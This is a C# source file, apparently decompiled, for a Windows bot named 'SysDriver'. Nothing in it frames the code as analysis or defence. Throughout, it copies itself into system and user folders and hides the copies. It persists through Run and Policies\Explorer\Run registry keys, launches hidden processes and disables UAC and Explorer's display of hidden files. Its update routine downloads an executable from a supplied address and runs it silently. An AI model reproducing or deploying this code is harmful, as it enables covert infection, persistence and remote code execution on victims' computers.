using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

namespace SysDriver;

internal class cSystem
{
	private Mutex yMutex;

	private cPersistent PersistentClass = new cPersistent();

	public void loadSystem()
	{
		createMutex();
		DisableProcedures();
		InstallBot();
		PersistentClass.loadPersistent();
	}

	private void createMutex()
	{
		try
		{
			yMutex = new Mutex(initiallyOwned: true, cMain.ConfigClass.sMutex);
			yMutex.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}

	private void InstallBot()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (cMain.ConfigClass.bAdminStatus)
		{
			cMain.ConfigClass.sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + cMain.ConfigClass.sFileName[0];
			cMain.ConfigClass.sFilePath[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + "\\" + cMain.ConfigClass.sFileName[1];
		}
		else
		{
			cMain.ConfigClass.sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + cMain.ConfigClass.sFileName[0];
			cMain.ConfigClass.sFilePath[1] = Environment.GetEnvironmentVariable("TEMP") + "\\" + cMain.ConfigClass.sFileName[1];
		}
		if (checkInstall())
		{
			return;
		}
		try
		{
			string[] sFilePath = cMain.ConfigClass.sFilePath;
			foreach (string text in sFilePath)
			{
				if (!cMain.FunctionClass.checkFile(text))
				{
					File.Copy(fileName, text);
				}
				File.SetAttributes(text, FileAttributes.Hidden);
			}
		}
		catch
		{
		}
		if (cMain.ConfigClass.bAdminStatus)
		{
			try
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(cMain.ConfigClass.sRegName[1], '"' + cMain.ConfigClass.sFilePath[1] + '"');
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(cMain.ConfigClass.sRegName[1], '"' + cMain.ConfigClass.sFilePath[1] + '"');
			}
			catch
			{
			}
		}
		try
		{
			yMutex.Close();
			string[] sFilePath2 = cMain.ConfigClass.sFilePath;
			foreach (string fileName2 in sFilePath2)
			{
				Process process = new Process();
				process.StartInfo.FileName = fileName2;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public void updateBot(string sFileAddress)
	{
		try
		{
			yMutex.Close();
		}
		catch
		{
		}
		try
		{
			string text = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
			new WebClient().DownloadFile(sFileAddress, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public void RemoveBot()
	{
		PersistentClass.stopPersistent();
		if (cMain.ConfigClass.bAdminStatus)
		{
			try
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(cMain.ConfigClass.sRegName[0]);
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(cMain.ConfigClass.sRegName[1]);
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(cMain.ConfigClass.sRegName[0]);
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(cMain.ConfigClass.sRegName[1]);
			}
			catch
			{
			}
		}
		try
		{
			string[] sFilePath = cMain.ConfigClass.sFilePath;
			foreach (string path in sFilePath)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	private bool checkInstall()
	{
		string[] sFilePath = cMain.ConfigClass.sFilePath;
		int num = 0;
		while (true)
		{
			if (num < sFilePath.Length)
			{
				string filePath = sFilePath[num];
				if (!cMain.FunctionClass.checkFile(filePath))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private void DisableProcedures()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (cMain.ConfigClass.bDisableUAC)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
	}
}
